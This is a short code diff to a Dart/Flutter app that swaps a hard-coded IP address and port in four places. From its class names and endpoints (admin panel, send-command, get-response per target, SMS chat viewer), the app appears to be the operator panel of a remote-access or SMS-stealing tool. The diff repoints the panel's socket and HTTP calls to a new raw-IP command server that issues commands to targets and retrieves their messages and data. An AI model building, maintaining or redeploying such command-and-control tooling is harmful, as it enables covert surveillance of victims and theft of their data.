@@ -74,7 +74,7 @@ class _ControlCenterPageState extends State<ControlCenterPage>
   void _initSocket() {
     try {
       socket = IO.io(
-        'http://104.207.64.203:2001',
+        'http://188.166.176.83:10733',
         IO.OptionBuilder()
             .setTransports(['websocket'])
             .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_$_operator'})
@@ -599,7 +599,7 @@ class _ControlCenterPageState extends State<ControlCenterPage>
     try {
       final response = await http
           .post(
-            Uri.parse("http://104.207.64.203:2001/api/send-command"),
+            Uri.parse("http://188.166.176.83:10733/api/send-command"),
             headers: {"Content-Type": "application/json"},
             body: jsonEncode({
               "key": _sessionKey,
@@ -1567,7 +1567,7 @@ class _SmsChatViewerPageState extends State<SmsChatViewerPage> {
       final res = await http
           .get(
             Uri.parse(
-              "http://104.207.64.203:2001/api/get-response/${widget.targetId}",
+              "http://188.166.176.83:10733/api/get-response/${widget.targetId}",
             ),
           )
           .timeout(const Duration(seconds: 10));
@@ -1865,7 +1865,7 @@ class _DataViewerPageState extends State<DataViewerPage> {
       final res = await http
           .get(
             Uri.parse(
-              "http://104.207.64.203:2001/api/get-response/${widget.targetId}",
+              "http://188.166.176.83:10733/api/get-response/${widget.targetId}",
             ),
           )
           .timeout(const Duration(seconds: 10));
